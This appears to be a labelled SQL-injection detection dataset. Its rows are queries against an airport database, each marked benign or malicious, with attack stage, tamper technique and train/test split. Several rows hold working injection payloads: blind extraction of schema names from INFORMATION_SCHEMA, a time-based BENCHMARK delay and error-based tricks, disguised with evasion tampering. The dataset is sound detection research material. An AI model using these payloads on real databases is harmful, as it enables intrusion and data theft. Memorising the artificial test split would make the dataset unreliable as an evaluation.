"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BG"") OR a.elevation_ft > 427.0",0,BG 427.0,,,,select,airport-S11,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.9 AND  121.85  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.405  AND  120.5  ORDER BY frequency;",0,123.9 121.85 122.405 120.5,,,,select,airport-S13,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""5AZ3"",""heliport"", ""Saint-Affrique-Belmont Airfield"",""https://en.wikipedia.org/wiki/Roxas_Airport"",""AF"")",0,5AZ3 heliport Saint-Affrique-Belmont Airfield https://en.wikipedia.org/wiki/Roxas_Airport AF,,,,insert,airport-I3,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Lake Toba, North Tapanuli"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Bayburt Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""مطارات الجزائر"", ""%"");",0,"Lake Toba, North Tapanuli Airports in Bayburt Province مطارات الجزائر",,,,select,airport-S18,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BD"" GROUP BY r.name ORDER BY r.name ASC;",0,BD,,,,select,airport-S5,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Custume Barracks Heliport"");",0,Custume Barracks Heliport,,,,select,airport-S12,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""VR Campos do Jordão Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,VR Campos do Jordão Heliport,,,,select,airport-S14,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1230.0",0,US 1230.0,,,,select,airport-S11,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""GD"" OR c.name LIKE CONCAT(""%"", ""Isle of Man"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,GD Isle of Man 5,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""TZ-0001"", ""small_airport"", ""Hespero Airport"", 51.85366, 22.801000595092773, 30.0)",0,TZ-0001 small_airport Hespero Airport 51.85366 22.801000595092773 30.0,,,,insert,airport-I2,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""San Pedro Highway Airstrip""",0,San Pedro Highway Airstrip,,,,select,airport-S3,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""IR"") OR a.elevation_ft > 36.0",0,IR 36.0,,,,select,airport-S11,,,test
"UPDATE airport SET name = ""Fazenda Santa Maria do Palmas Airstrip"" WHERE ident = ""US-5738""",0,Fazenda Santa Maria do Palmas Airstrip US-5738,,,,update,airport-U1,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MT"" OR c.name LIKE CONCAT(""%"", ""Tuvalu"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,MT Tuvalu 4,,,,select,airport-S20,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Hospital Alejandro Otero Lopez Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Hospital Alejandro Otero Lopez Heliport,,,,select,airport-S14,,,test
"DELETE FROM regions WHERE name = ""Norte de Santander Department"" or (select 2*(if((select * from (select concat(0x717a6a7871,(select (ELT(5436=5436,1))),0x7171626271,0x78))s), 8446744073709551610, 8446744073709551610)))-- CMcy"";",1," Norte de Santander Department"" or (select 2*(if((select * from (select concat(0x717a6a7871,(select (ELT(5436=5436,1))),0x7171626271,0x78))s), 8446744073709551610, 8446744073709551610)))-- CMcy ",recon,lowercase,success,delete,airport-D8,error-151,error,test
"UPDATE navaids SET name = ""Nyiregyhaza"" WHERE ident = ""SJM)/**/AS/**/XEkr/**/WHERE/**/2517=2517/**/AND/**/6763=6763--/**/-"";",1, Nyiregyhaza SJM)/**/AS/**/XEkr/**/WHERE/**/2517=2517/**/AND/**/6763=6763--/**/- ,recon,space2comment,success,update,airport-U7,boolean-90,boolean,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 134.45 AND  120.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  121.75  AND  891.8  ORDER BY frequency;",0,134.45 120.1 121.75 891.8,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 1240.0",0,BR 1240.0,,,,select,airport-S11,,,test
"DELETE FROM navaids WHERE ident = ""CAR"";",0,CAR,,,,delete,airport-D6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Campo di Volo Natile"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""FMNJ"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Palanquero Airport"", ""%"");",0,Campo di Volo Natile FMNJ Palanquero Airport,,,,select,airport-S17,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Wolf River Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Wolf River Airport,,,,select,airport-S14,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""EH6"") OR name LIKE ""Samsung Life Insurance""",0,EH6 Samsung Life Insurance,,,,select,airport-S10,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Tsimlyansk Airport, Аэропорт Волгодонск, Аэропорт Цимлянск, URRQ, VLK, URRY"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Alberto Bertelli"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WEX, EICD"", ""%"");",0,"Tsimlyansk Airport, Аэропорт Волгодонск, Аэропорт Цимлянск, URRQ, VLK, URRY Alberto Bertelli WEX, EICD",,,,select,airport-S17,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Hagen Airport"");",0,Hagen Airport,,,,select,airport-S12,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SWYD, SWYD"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""42MI"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""gaucharan"", ""%"");",0,"SWYD, SWYD 42MI gaucharan",,,,select,airport-S17,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""DE-0599"";",0,DE-0599,,,,select,airport-S7,,,test
"UPDATE countries SET keywords = ""Sierra Leonean airports""   WHERE  4282=4282    AND    1047=(    SELECT   (  CASE       WHEN    (  ORD( MID((    SELECT      IFNULL(    CAST(    column_name     AS      NCHAR  ),0x20)    FROM   INFORMATION_SCHEMA.    COLUMNS     WHERE   table_name    =0x6e617661696473    AND    table_schema=0x64617461736574  LIMIT  16,1),1,1))>110)  THEN     1047    ELSE     (    SELECT   4143    UNION       SELECT   8683)  END  ))-- -"" WHERE code = ""IO"";",1," Sierra Leonean airports""   WHERE  4282=4282    AND    1047=(    SELECT   (  CASE       WHEN    (  ORD( MID((    SELECT      IFNULL(    CAST(    column_name     AS      NCHAR  ),0x20)    FROM   INFORMATION_SCHEMA.    COLUMNS     WHERE   table_name    =0x6e617661696473    AND    table_schema=0x64617461736574  LIMIT  16,1),1,1))>110)  THEN     1047    ELSE     (    SELECT   4143    UNION       SELECT   8683)  END  ))-- - IO ",exploit,multiplespaces,success,update,airport-U8,boolean-96,boolean,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (86698, ""ISV"", ""Jackson"", ""NDB"", 113800, ""RU"")",0,86698 ISV Jackson NDB 113800 RU,,,,insert,airport-I10,,,train
"UPDATE airport SET home_link = ""http://www.hwas.orangehome.co.uk/"" WHERE name = ""Staňkov Airfield""",0,http://www.hwas.orangehome.co.uk/ Staňkov Airfield,,,,update,airport-U4,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91365, ""VR"", ""Atyrau"", ""NDB"", 412, ""GR"")",0,91365 VR Atyrau NDB 412 GR,,,,insert,airport-I10,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Salaika Aviation Heliport"") OR name LIKE ""11Z""",0,Salaika Aviation Heliport 11Z,,,,select,airport-S10,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91518, ""KL"", ""Kanan"", ""NDB'WHERE4724=4724
AND8855=(SELECT	COUNT(*)�FROMINFORMATION_SCHEMA.COLUMNSA,INFORMATION_SCHEMA.COLUMNS	B,INFORMATION_SCHEMA.COLUMNSC�WHERE
0
XOR1)#"", 113800, ""UA"")",1," 91518 KL"" Kanan"" NDB'WHERE4724=4724
AND8855=(SELECT	COUNT(*)�FROMINFORMATION_SCHEMA.COLUMNSA,INFORMATION_SCHEMA.COLUMNS	B,INFORMATION_SCHEMA.COLUMNSC�WHERE
0
XOR1)# 113800 UA ",recon,space2mysqlblank,success,insert,airport-I10,time-58,time,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Dittingen, LSPD,"") OR name LIKE ""Y0TP""",0,"Dittingen, LSPD, Y0TP",,,,select,airport-S10,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""BR""",0,BR,,,,select,airport-S6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Gage Flying Farmer Airport"");",0,Gage Flying Farmer Airport,,,,select,airport-S12,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 105.0",0,BR 105.0,,,,select,airport-S11,,,test
"DELETE FROM airport WHERE ident=""MN49"";",0,MN49,,,,delete,airport-D1,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Trelawny Parish"";",0,Trelawny Parish,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE gps_code = ""NY73"" OR local_code = ""SP0422""",0,NY73 SP0422,,,,select,airport-S4,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 6309.0",0,US 6309.0,,,,select,airport-S11,,,test
"DELETE FROM airport_frequencies WHERE type = ""TWR"";",0,TWR,,,,delete,airport-D4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""RKUY, Yongchon, Yeongcheon, G 801, G-801"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""TA12"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""19IL"", ""%"");",0,"RKUY, Yongchon, Yeongcheon, G 801, G-801 TA12 19IL",,,,select,airport-S17,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""WIAB"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Töv Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""مطارات العراق"", ""%"");",0,WIAB Airports in Töv Province مطارات العراق,,,,select,airport-S18,,,train
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""KZ-ABA) RLIKE (SELECT (CASE WHEN (9011 LIKE 9011) THEN 0x4b5a2d414241 ELSE 0x28 END))-- UuOA"", ""Maseru District"", ""AS"", ""FI"", ""https://en.wikipedia.org/wiki/New_Valley_Governorate"", ""Airports in Mono Department"")",1, KZ-ABA) RLIKE (SELECT (CASE WHEN (9011 LIKE 9011) THEN 0x4b5a2d414241 ELSE 0x28 END))-- UuOA Maseru District AS FI https://en.wikipedia.org/wiki/New_Valley_Governorate Airports in Mono Department ,recon,equaltolike,success,insert,airport-I4,boolean-18,boolean,test
"SELECT id FROM airports WHERE longitude BETWEEN -68.901057 AND 138.911362 AND name LIKE ""%3sxIR1jZ3HYOKuoTwUfL%"" OR name LIKE ""%95ZJP0OchJctNfxGlcbd%"" AND municipality = ""Rocky Hill"" AND elevation_feet <= 32.0 AND latitude BETWEEN 33.491231 AND 0.598082 AND type IN (""heliport"",""small_airport"") AND scheduled_service LIKE ""yes""",0,-68.901057 138.911362 3sxIR1jZ3HYOKuoTwUfL 95ZJP0OchJctNfxGlcbd Rocky Hill 32.0 33.491231 0.598082 heliport small_airport yes,,,,select,airport-S23,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""La Unión Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,La Unión Airport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2694"" AS SIGNED) AND a.iso_country = ""AL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2694 AL,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""NE"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,NE 5,,,,select,airport-S19,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LB"" GROUP BY r.name ORDER BY r.name ASC;",0,LB,,,,select,airport-S16,,,test
"DELETE FROM navaids WHERE ident = ""QW"";",0,QW,,,,delete,airport-D6,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Makinohara / Shimada;""",0,Makinohara / Shimada,,,,select,airport-S21,,,test
"DELETE FROM navaids WHERE ident = ""SH"";",0,SH,,,,delete,airport-D6,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),12,1))>96,5714) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 5,1),12,1))>96,5714) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Jonesville Mine Airport"");",0,Jonesville Mine Airport,,,,select,airport-S12,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 755.0 AND 1247.0",0,755.0 1247.0,,,,select,airport-S2,,,test
"SELECT id FROM airports WHERE elevation_feet <= 400.0 AND ( FIND_IN_SET(""9l2inaxZbuHSD9bnllFU"", keywords_field) > 0 OR FIND_IN_SET(""LcSd1DCY4yAIT2WOpmId"", keywords_field) > 0 OR FIND_IN_SET(""QnjMmlnj0rwqBwxXmFMS"", keywords_field) > 0) AND scheduled_service LIKE ""no"" AND longitude >= -101.87303",0,400.0 9l2inaxZbuHSD9bnllFU LcSd1DCY4yAIT2WOpmId QnjMmlnj0rwqBwxXmFMS no -101.87303,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.975 AND  132.35  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.475  AND  124.65  ORDER BY frequency;",0,118.975 132.35 120.475 124.65,,,,select,airport-S13,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Chaguanas"";",0,Chaguanas,,,,select,airport-S15,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Micheldorf Airfield"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Micheldorf Airfield,,,,select,airport-S14,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.9 AND  123.2  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.325  AND  128.2  ORDER BY frequency;",0,122.9 123.2 118.325 128.2,,,,select,airport-S13,,,test
"UPDATE airport SET municipality = ""Procida (NA)"" WHERE iso_country = ""US""",0,Procida (NA) US,,,,update,airport-U2,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""RPM Airport"");",0,RPM Airport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE gps_code = ""KPOE"" OR local_code = ""SPO""",0,KPOE SPO,,,,select,airport-S4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4563"" AS SIGNED) AND a.iso_country = ""PM"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4563 PM,,,,select,airport-S22,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5512"" AS SIGNED) AND a.iso_country = ""TF"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5512 TF,,,,select,airport-S22,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Lądowisko Witniec,Witnica"") OR name LIKE ""Balad Southeast Air Base,Al-Bakir Air Base, Camp Anaconda, قاعدة البكر الجوية""",0,"Lądowisko Witniec,Witnica Balad Southeast Air Base,Al-Bakir Air Base, Camp Anaconda, قاعدة البكر الجوية",,,,select,airport-S10,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BB"" GROUP BY r.name ORDER BY r.name ASC;",0,BB,,,,select,airport-S16,,,test
"INSERT INTO countries (code, name, continent) VALUES (""EE"", ""Heard and McDonald Islands"", ""EU"")",0,EE Heard and McDonald Islands EU,,,,insert,airport-I7,,,train
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (90269, ""TH"", ""Tumaco"", ""VOR-DME"", 755, ""IN"")",0,90269 TH Tumaco VOR-DME 755 IN,,,,insert,airport-I10,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""UL-Flugplatz Drensteinfurt, Flugplatz Flugschule Thomas Weigel, Thomas Weigel Flight School"") OR name LIKE ""EBBG, EBBG""",0,"UL-Flugplatz Drensteinfurt, Flugplatz Flugschule Thomas Weigel, Thomas Weigel Flight School EBBG, EBBG",,,,select,airport-S10,,,train
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Laguna Ranch Airport"");",0,Laguna Ranch Airport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE gps_code = ""CJC6"" OR local_code = ""K51""",0,CJC6 K51,,,,select,airport-S4,,,test
"UPDATE airport SET name = ""Ceta Ecotel Heliport"" WHERE 6181 LIKE 6181 AND 8216 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>112) THEN 8216 ELSE (SELECT 1559 UNION SELECT 4727) END))-- -"" WHERE ident = ""PS01""",1," Ceta Ecotel Heliport  WHERE 6181 LIKE 6181 AND 8216 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>112) THEN 8216 ELSE (SELECT 1559 UNION SELECT 4727) END))-- - PS01 ",exploit,equaltolike,success,update,airport-U1,boolean-60,boolean,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""WT81"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Zadar County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Montenegran airports"", ""%"");",0,WT81 Airports in Zadar County Montenegran airports,,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""AR-0255"",""small_airport)));SeLeCT BeNCHmaRK(5000000,MD5(0x42735473)) aND (((9907=9907"", ""Masame Airport"",""https://en.wikipedia.org/wiki/Anshun_Huangguoshu_Airport"",""AS"")",1," AR-0255 small_airport)));SeLeCT BeNCHmaRK(5000000,MD5(0x42735473)) aND (((9907=9907 Masame Airport https://en.wikipedia.org/wiki/Anshun_Huangguoshu_Airport AS ",recon,randomcase,failure,insert,airport-I3,stacked-15,stacked,test
"UPDATE airport SET name = ""Lewis Airfield"" WHERE ident = ""WA66""",0,Lewis Airfield WA66,,,,update,airport-U1,,,train
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-MI""",0,EU US-MI,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1766.0 AND 2925.0",0,1766.0 2925.0,,,,select,airport-S2,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""SI-063"", ""Pine Cay"", ""EU"", ""AR"", ""https://en.wikipedia.org/wiki/Sulawesi_Tenggara"", ""Airports in Kassala State"")",0,SI-063 Pine Cay EU AR https://en.wikipedia.org/wiki/Sulawesi_Tenggara Airports in Kassala State,,,,insert,airport-I4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BF"" GROUP BY r.name ORDER BY r.name ASC;",0,BF,,,,select,airport-S16,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""La Argentina Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,La Argentina Airport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5676"" AS SIGNED) AND a.iso_country = ""KZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5676 KZ,,,,select,airport-S22,,,test
